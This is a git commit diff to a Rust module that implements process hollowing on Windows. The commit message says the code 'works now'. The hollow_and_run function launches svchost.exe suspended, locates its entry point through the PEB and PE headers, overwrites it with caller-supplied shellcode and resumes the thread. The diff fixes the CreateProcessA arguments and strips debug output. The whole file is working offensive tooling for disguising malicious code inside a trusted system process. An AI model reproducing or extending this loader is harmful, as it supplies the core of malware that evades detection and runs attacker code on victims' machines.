684bcc572e6762c1a11ef9c2f90d92f208878fd1
koins <koins@duck.com>
2022-01-27 23:41:42 -0800

    it works now. my brain is mush, but it works now

--- process_hollowing/src/rco_process_hollowing_windows/mod.rs
+++ process_hollowing/src/rco_process_hollowing_windows/mod.rs
@@ -2,18 +2,16 @@ extern crate windows;
 use std::{mem, ptr};
 use std::ffi::{CString, c_void};
 use windows::Win32::Foundation::PSTR;
-use windows::Win32::Security::SECURITY_ATTRIBUTES;
 use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
 use windows::Win32::System::Threading::{CreateProcessA, CREATE_SUSPENDED, NtQueryInformationProcess, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, ResumeThread, STARTUPINFOA};
-use std::{thread, time};
 
 const POINTER_SIZE: usize = mem::size_of::<&u8>();
 const POINTER_SIZE_TIMES_SIX: u32 = POINTER_SIZE as u32 * 6;
 const E_LFANEW_OFFSET: usize = 0x3C;
 const OPTHDR_ADDITIONAL_OFFSET: usize = 0x28;
 
+// There's something wrong here --> https://www.reddit.com/r/rust/comments/sc6cae/question_calling_writeprocessmemory_win32_from/
 pub fn hollow_and_run(shellcode: &[u8]) {
-    let time = time::Duration::from_millis(20000);
     // Create empty StartupInfoA struct for use in CreateProcess
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfow
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.STARTUPINFOW.html
@@ -30,18 +28,15 @@ pub fn hollow_and_run(shellcode: &[u8]) {
     let lp_application_name: PSTR = unsafe { mem::zeroed() };
     let mut lp_command_line: PSTR = unsafe { mem::zeroed() };
     lp_command_line.0 = CString::new("C:\\Windows\\System32\\svchost.exe").unwrap().into_raw() as *mut u8;
-    let lp_process_attributes: SECURITY_ATTRIBUTES = unsafe { mem::zeroed() };
-    let lp_thread_attributes: SECURITY_ATTRIBUTES = unsafe { mem::zeroed() };
-    let lp_environment: c_void = unsafe { mem::zeroed() };
     let lp_current_directory: PSTR = unsafe { mem::zeroed() };
     let creation_result = unsafe { CreateProcessA(
         lp_application_name,
         lp_command_line,
-        &lp_process_attributes,
-        &lp_thread_attributes,
+        ptr::null(),
+        ptr::null(),
         false,
         CREATE_SUSPENDED,
-        &lp_environment,
+        ptr::null() as *const _,
         &lp_current_directory,
         &startup_info,
         &mut process_information) };
@@ -89,6 +84,7 @@ pub fn hollow_and_run(shellcode: &[u8]) {
     let opthdr_offset = e_lfanew as usize + OPTHDR_ADDITIONAL_OFFSET;
     let entry_point_rva = rco_utils::array_to_u32_lit_end(&header_buffer[opthdr_offset..opthdr_offset + 0x04].try_into().unwrap());
     let entry_point_address = entry_point_rva as u64 + pe_base_address;
+
     if header_buffer[e_lfanew as usize + 0x18] != 11 || header_buffer[e_lfanew as usize + 0x19] != 2 {
         panic!("An offset looks incorrect, the optional header magic bytes don't correspond to '0x020B'");
     }
@@ -97,13 +93,6 @@ pub fn hollow_and_run(shellcode: &[u8]) {
     if !write_result.as_bool() {
         panic!("Could not write the shellcode to the suspended process with WriteProcessMemory");
     }
-
-    let pid = basic_information.UniqueProcessId;
-    let near = entry_point_address as usize + shellcode.len() - 32;
-    println!("PID --> {pid}");
-    println!("Entry point --> {entry_point_address:x}");
-    println!("Near buffer end --> {near:x}");
-    thread::sleep(time);
 
     // Start it back up with ResumeThread
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread
